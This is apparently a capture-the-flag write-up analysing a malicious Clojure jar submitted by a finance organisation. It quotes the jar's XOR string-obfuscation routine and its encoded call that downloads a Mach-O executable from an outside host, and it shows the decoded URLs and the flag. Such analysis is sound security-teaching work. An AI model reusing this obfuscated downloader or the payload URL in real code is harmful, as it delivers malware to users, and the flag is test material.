# Starting Point

> Points: 6

> URL: https://drive.google.com/file/d/12DjJPbMUfFIbG2zq33d7kUrCVeoVDTY9/view?usp=sharing </br>
An organization from the finance sector has reported a malicious activity and submitted a file for analysis. What does this file do?

From the link provided, we're downloading `autotrader-1.0.0-standalone.jar` and by looking into it using the [`jadx-gui`](https://github.com/skylot/jadx) tool, we see references to `clojure`. Since we have no experience with Clojure, next several hours were spent reading online resources and trying to understand the code. Interesting code was found in `autotrader.clj` where some parts looked like obfuscation function:

```
(defn load-meta []
  (let [bytes [0xac 0xb2 0xd2 0xba 0xb2 0xad 0xa3 0x7a
               0x84 0xca 0x76 0x9e 0xcf 0x9d 0x85 0x74
               0xaa 0x60]
        pb (map-indexed (fn [idx byte]
                                       (-> byte
                                           (bit-xor idx)
                                           (+ idx)
                                           bit-not))
                                     bytes)]
    (apply str (map char (map (fn [b] (bit-and b 0xff)) pb)))))

```

Also there were two commented-out lines that looked interesting:

```
;(println (load-meta))
;(download-current-market-data "Oz9ZMzZoe1QbUgorVQAPGxsePCYCMSQlew0xWyM1AxM1")
(download-current-market-data "Oz9ZM399exIFR0pxQwlJFlBPMX9OcCQ2ZkxYAxpmAAZXRQdMZ3xJJnNmN0tcV05wXQMUHlAJ")
```

Next steps are to uncomment the `println` and see what is says. After modifying `autotrader.clj` file, we struggled to figure out how to run it, eventually, after many different failures trying to run `autotrader.clj` using various `clj`, `clojure`, `lein` tools, we did following:

- extracted jar file `unzip -d ./autotrader autotrader-1.0.0-standalone.jar`
- opened `./autotrader/autotrader.clj` file in text editor and made following modifications: 
    - uncommented the `println` line
    - added two more lines to print the decoded urls used in the script:
      
      ```
      (println (load-url "Oz9ZMzZoe1QbUgorVQAPGxsePCYCMSQlew0xWyM1AxM1" (load-meta)))
      (println (load-url "Oz9ZM399exIFR0pxQwlJFlBPMX9OcCQ2ZkxYAxpmAAZXRQdMZ3xJJnNmN0tcV05wXQMUHlAJ" (load-meta)))
      ```

- packed the files back into jar: `jar -cmf META-INF/MANIFEST.MF ../autotrader_modified.jar *`
- executed modified jar file: `java -jar autotrader_modified.jar` and got first flag:

  ```
  # java -jar autotrader_modified.jar                         
  Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
  SK-CERT{k3y_0bfu5}
  https://pastebin.com/raw/vZhZj3qS
  http://int3.sk/ce2b4c3ad2730c90d102147de64c07d7/market

  ```

First link is canary, while the second link, which is used in the original jar file, downloads file `market` which is `Mach-O 64-bit x86_64 executable` and part of next challenge.

> flag: `SK-CERT{k3y_0bfu5}`

# Big Problem

> Points: 6

> It appears that the initial program has dropped another file. What is the function of this new file?

